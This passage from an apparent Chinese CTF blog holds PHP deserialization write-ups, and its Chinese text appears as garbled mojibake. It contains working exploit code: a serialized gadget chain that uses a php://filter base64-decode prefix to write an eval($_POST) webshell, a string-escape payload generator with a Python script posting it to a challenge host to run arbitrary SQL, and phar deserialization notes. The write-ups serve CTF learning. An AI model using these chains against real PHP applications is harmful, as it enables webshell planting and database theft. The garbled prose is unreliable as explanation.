<p>5.Bç±»çš„serializeæ–¹æ³•ï¼Œè¿”å›$serialize($dara)ï¼Œå¯ä»¥ä½¿$this-&gt;options[â€˜serializeâ€™]ç­‰äºserialize</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cF01Tx"><img src="https://z3.ax1x.com/2021/03/30/cF01Tx.png" alt="cF01Tx.png"></a></p>
<p>6.setæ–¹æ³•ä¸­æ–‡ä»¶å†…å®¹$dataè¢«æ‹¼æ¥ä¸Šäº†&lt;?php exit();ã€‚ç”±äºfile_put_contentsçš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä¸ºphpä¼ªåè®®ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è®¾ç½®file_put_contentsçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºphp://fliter/write=convert.base64-decodeï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºbase64ç¼–ç åçš„ä¸€å¥è¯ï¼Œè¿™æ ·å‰é¢çš„æ‹¼æ¥ä¸Šçš„&lt;?php exit();å°±ä¼šè¢«è½¬æ¢æˆä¹±ç ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cF0GtK"><img src="https://z3.ax1x.com/2021/03/30/cF0GtK.png" alt="cF0GtK.png"></a></p>
<p>cacheå±æ€§çš„å¤„ç†è¿‡ç¨‹ï¼Œæœ€ç»ˆä½œä¸ºæ–‡ä»¶å†…å®¹å‚æ•°ä¼ å…¥file_put_contents</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serialize(json_encode(cleanContents(<span class="keyword">$this</span>-&gt;cache)))</span><br></pre></td></tr></table></figure>

<h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>æ„é€ exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span> =[];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$complete</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">&#x27;/../1.php/.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = [<span class="string">&#x27;dirname&#x27;</span>=&gt;<span class="string">&#x27;aPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span> = [</span><br><span class="line">        <span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&#x27;serialize&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=./uploads/&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æˆåŠŸå†™å…¥æ–‡ä»¶</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cF0tpD"><img src="https://z3.ax1x.com/2021/03/30/cF0tpD.png" alt="cF0tpD.png"></a></p>
<p>æ‹¿åˆ°flag</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cF0JfO"><img src="https://z3.ax1x.com/2021/03/30/cF0JfO.png" alt="cF0JfO.png"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-27T14:09:46.000Z" title="2021-03-27T14:09:46.000Z">2021-03-27</time>å‘è¡¨</span><span class="level-item"><time dateTime="2021-03-27T14:17:15.199Z" title="2021-03-27T14:17:15.199Z">2021-03-27</time>æ›´æ–°</span><span class="level-item">6 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦865ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/27/GYCTF2020-Easyphp/">GYCTF2020 Easyphp</a></h1><div class="content"><h1 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h1><p>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</p>
<p>ä¸‹è½½<a target="_blank" rel="noopener" href="http://www.zipå¼€å§‹å®¡è®¡/">www.zipå¼€å§‹å®¡è®¡</a></p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSm2vt"><img src="https://z3.ax1x.com/2021/03/27/cSm2vt.png" alt="cSm2vt.png"></a></p>
<p>ç›®å½•ç»“æ„å¦‚ä¸‹ï¼Œlib.phpä¸­å­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨é“¾</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmWKP"><img src="https://z3.ax1x.com/2021/03/27/cSmWKP.png" alt="cSmWKP.png"></a></p>
<h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><p>1.update.phpå®ä¾‹åŒ–Userç±»å¹¶è°ƒç”¨update()</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmDED"><img src="https://z3.ax1x.com/2021/03/27/cSmDED.png" alt="cSmDED.png"></a></p>
<p>2.Userç±»çš„updateæ–¹æ³•unserialize($this-&gt;getNewinfo())ï¼Œåºåˆ—åŒ–å†…å®¹æ¥è‡ªäºgetNewinfoæ–¹æ³•</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSm0HO"><img src="https://z3.ax1x.com/2021/03/27/cSm0HO.png" alt="cSm0HO.png"></a></p>
<p>3.Userç±»çš„getNewInfo()æ–¹æ³•ï¼Œå°†Infoç±»åºåˆ—åŒ–ï¼Œå¹¶ä¸”safeå‡½æ•°æ”¹å˜äº†åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå­˜åœ¨å­—ç¬¦é€ƒé€¸ã€‚åªè¦ä¼ å…¥unionï¼Œå°±ä¼šè¢«è‡ªåŠ¨æ›¿æ¢æˆhackerï¼Œpayloadæœ‰å¤šé•¿ï¼Œå°±è¾“å…¥å¤šå°‘ä¸ªunionï¼Œè¿™æ ·å¤šå‡ºæ¥ä¸€ä¸ªå­—ç¬¦ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ»¡è¶³å‰é¢çš„å­—ç¬¦ä¸²é•¿åº¦åï¼Œåé¢çš„è¯­å¥ä»å­—ç¬¦ä¸²ä¸­é€ƒé€¸å‡ºæ¥ï¼ŒæˆåŠŸååºåˆ—åŒ–ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmdu6"><img src="https://z3.ax1x.com/2021/03/27/cSmdu6.png" alt="cSmdu6.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmc8A"><img src="https://z3.ax1x.com/2021/03/27/cSmc8A.png" alt="cSmc8A.png"></a></p>
<p>4.Infoç±»ä¸­çš„å±æ€§å‡å¯æ§ï¼Œageå±æ€§å’Œnicknameå±æ€§å‡ç”±postä¼ å€¼å¾—åˆ°ã€‚åˆ©ç”¨safeå‡½æ•°å¢åŠ å­—ç¬¦çš„åŠŸèƒ½è¿›è¡Œå­—ç¬¦ä¸²é€ƒé€¸ï¼Œååºåˆ—åŒ–æ¶æ„ç±»UpdateHelperï¼Œè¿™æ ·å³å¯æ‰§è¡Œä»»æ„sqlè¯­å¥ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmrUe"><img src="https://z3.ax1x.com/2021/03/27/cSmrUe.png" alt="cSmrUe.png"></a></p>
<h2 id="æ¶æ„ç±»"><a href="#æ¶æ„ç±»" class="headerlink" title="æ¶æ„ç±»"></a>æ¶æ„ç±»</h2><p>1.UpdateHelperç±»<code>__destruct()</code>æ–¹æ³•ï¼Œä»¤UpdateHelperç±»çš„sqlå±æ€§ç­‰äºUserç±»è§¦å‘<code>__toString()</code>æ–¹æ³•</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmwDK"><img src="https://z3.ax1x.com/2021/03/27/cSmwDK.png" alt="cSmwDK.png"></a></p>
<p>2.Userç±»çš„<code>__toString()</code>æ–¹æ³•ï¼Œåªè¦è®©nicknameå±æ€§ç­‰äºInfoç±»å³å¯è§¦å‘<code>__call()</code>æ–¹æ³•</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmUjx"><img src="https://z3.ax1x.com/2021/03/27/cSmUjx.png" alt="cSmUjx.png"></a></p>
<p>3.Infoç±»çš„__call()æ–¹æ³•,ä»¤å±æ€§CtrlCaseç­‰äºdbCtrlç±»,è°ƒç”¨å…¶ä¸­çš„loginæ–¹æ³•ï¼Œæ‰§è¡Œè¯­å¥$argument[0]å®é™…æ¥æºäºUserç±»çš„ageå±æ€§</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmrUe"><img src="https://z3.ax1x.com/2021/03/27/cSmrUe.png" alt="cSmrUe.png"></a></p>
<p>4.dbCtrlç±»çš„loginæ–¹æ³•ï¼Œæ¥æ”¶$sqlå‚æ•°å¹¶æ‰§è¡Œå®ƒï¼Œä¼ å…¥å‚æ•°å¯æ§ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„sqlè¯­å¥ã€‚éœ€è¦ä»¤nameå±æ€§ç­‰äºadminï¼Œç»‘å®šåˆ°sqlè¯­å¥ä¸­çš„?ä¸­ã€‚ç„¶åä»¤tokenå±æ€§ç­‰äºadminï¼Œå³å¯è¿”å›$idResultï¼Œçœ‹åˆ°sqlè¯­å¥æ‰§è¡Œçš„ç»“æœã€‚</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSm6Cd"><img src="https://z3.ax1x.com/2021/03/27/cSm6Cd.png" alt="cSm6Cd.png"></a></p>
<h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>æ„é€ exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;select password,id from user where username=?&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line"><span class="variable">$a</span>-&gt;sql=<span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$a</span>-&gt;sql-&gt;nickname=<span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$a</span>-&gt;sql-&gt;nickname-&gt;CtrlCase=<span class="keyword">new</span> dbCtrl();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&#x27;&quot;;s:3:&quot;ccc&quot;;&#x27;</span>.serialize(<span class="variable">$a</span>).<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo $pauload;</span></span><br><span class="line"><span class="variable">$p</span>=str_repeat(<span class="string">&#x27;union&#x27;</span>,strlen(<span class="variable">$payload</span>)).<span class="variable">$payload</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://8f273265-29ea-44e2-afae-70823a82f76f.node3.buuoj.cn/update.php&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;age&quot;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;nickname&quot;</span>:<span class="string">&#x27;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:3:&quot;ccc&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSms4H"><img src="https://z3.ax1x.com/2021/03/27/cSms4H.png" alt="cSms4H.png"></a></p>
<p>è§£å¯†ç™»é™†åæ‹¿åˆ°flag</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cSmggI"><img src="https://z3.ax1x.com/2021/03/27/cSmggI.png" alt="cSmggI.png"></a></p>
<p>å‚è€ƒï¼š</p>
<p><a target="_blank" rel="noopener" href="https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/">https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf.ieki.xyz/buuoj/gyctf-2020.html">https://ctf.ieki.xyz/buuoj/gyctf-2020.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.1ight.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/">https://www.1ight.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-25T14:03:26.000Z" title="2021-03-25T14:03:26.000Z">2021-03-25</time>å‘è¡¨</span><span class="level-item"><time dateTime="2021-03-25T14:09:51.095Z" title="2021-03-25T14:09:51.095Z">2021-03-25</time>æ›´æ–°</span><span class="level-item">8 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦1184ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/25/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">pharååºåˆ—åŒ–å­¦ä¹ </a></h1><div class="content"><h1 id="pharæ–‡ä»¶ç»“æ„åˆ†æ"><a href="#pharæ–‡ä»¶ç»“æ„åˆ†æ" class="headerlink" title="pharæ–‡ä»¶ç»“æ„åˆ†æ"></a>pharæ–‡ä»¶ç»“æ„åˆ†æ</h1><p> å¤§ä½“æ¥è¯´ Phar ç»“æ„ç”±4éƒ¨åˆ†ç»„æˆ</p>
<p><strong>1.stub ï¼špharæ–‡ä»¶æ ‡è¯†</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Phar::mapPhar();</span><br><span class="line">include &#39;phar:&#x2F;&#x2F;phar.phar&#x2F;index.php&#39;;</span><br><span class="line">__HALT_COMPILER();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸º<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ç•™ä¸‹è¿™ä¸ªæ ‡å¿—ä½ï¼Œæ„é€ ä¸€ä¸ªå›¾ç‰‡æˆ–è€…å…¶ä»–æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Œå¹¶ä¸”è¢« phar è¿™å‡½æ•°è¯†åˆ«åˆ©ç”¨ã€‚</p>
<p><strong>2. a manifest describing the contents</strong><br> pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚</p>
<p><strong>3. the file contents</strong><br> è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong><br> ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œæ ¼å¼å¦‚ä¸‹</p>
<h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><p>æŠŠä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œå‚¨å­˜åœ¨pharæ ¼å¼çš„æ–‡ä»¶ä¸­ï¼Œç”Ÿæˆåçš„æ–‡ä»¶å¯ä»¥ä»¥ä»»æ„æ ¼å¼ä¿å­˜ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«å‡½æ•°ï¼ˆä¸‹å›¾ï¼‰ï¼Œç”¨phar://åè®®åŒ…å«æ–‡ä»¶ï¼Œå°±å¯ä»¥æŠŠå¯¹è±¡ååºåˆ—åŒ–ã€‚<br>phpä¸­å¤§éƒ¨åˆ†æ–‡ä»¶å‡½æ•°åœ¨é€šè¿‡phar://è§£æpharæ–‡ä»¶æ—¶ï¼Œä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Xd2zF"><img src="https://z3.ax1x.com/2021/03/25/6Xd2zF.png" alt="6Xd2zF.png"></a></p>
<p>åˆ©ç”¨åŸç†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destructed&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>åˆ©ç”¨æ€è·¯ï¼š$this-&gt;Filenameå¯æ§ï¼Œä»GETå‚æ•°nameä¸­è·å–ã€‚Uploaderç±»ä¸­çš„<code>__toString()</code>æ–¹æ³•è¿”å›<code>$this-&gt;Filename</code>ï¼Œæœ€åçš„flie_get_contentså‚æ•°å®é™…å¯ç›´æ¥ä»nameå‚æ•°è·å–ï¼Œè¿™æ ·å°±å¯ä»¥ç”¨phar://è§¦å‘ååºåˆ—åŒ–ã€‚æ­¤å¤–è¿˜éœ€è¦æ»¡è¶³æ¡ä»¶<code>$this-&gt;token</code> ç­‰äº<code>$_SESSION[&#39;user&#39;]</code>ï¼Œ<code>$_SESSION[&#39;user&#39;]</code>å¯ä»æ–‡ä»¶åä¸­è·å¾—ã€‚æœ€åæ„é€ phar://åŒ…å«æ–‡ä»¶ã€‚</p>
<p>å¼€å§‹ç”¨å¼±å£ä»¤admin passwordç™»é™†</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6XdgRU"><img src="https://z3.ax1x.com/2021/03/25/6XdgRU.png" alt="6XdgRU.png"></a></p>
<p>å¼±å£ä»¤ç™»é™†è¿›å»ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰ç»™å‡ºè¿”å›è·¯å¾„ï¼Œè§‚å¯Ÿåˆ°fileå‚æ•°å¯èƒ½å¯ä»¥åˆ©ç”¨</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6XdsI0"><img src="https://z3.ax1x.com/2021/03/25/6XdsI0.png" alt="6XdsI0.png"></a></p>
<p>åªè¦å‚æ•°ä¸­ä¸ä»¥homeå’Œuploadç»“å°¾å°±ä¼šè‡ªåŠ¨æŠŠåç¼€åæ”¹æˆcc.fxxkyou!</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Xd6iV"><img src="https://z3.ax1x.com/2021/03/25/6Xd6iV.png" alt="6Xd6iV.png"></a></p>
<p>åˆ©ç”¨php://filterè¯»å–æ–‡ä»¶æºç </p>
